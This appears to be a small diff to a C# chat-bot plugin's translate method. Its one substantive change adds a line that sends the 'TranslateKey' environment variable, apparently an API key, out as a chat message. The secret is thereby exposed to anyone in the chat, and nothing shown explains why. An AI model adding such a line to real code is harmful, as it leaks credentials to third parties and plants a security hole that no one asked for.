@@ -39,9 +39,11 @@ namespace List
                 input.Callbacks.SendMessage(translate(input.Message, input).ToString());
             }
         }
+
         public string translate(string text, PluginInput input)
         {
             var value = Environment.GetEnvironmentVariable("TranslateKey");
+            input.Callbacks.SendMessage(value);
             string len = input.PersistentData;
             if (len == null)
             {
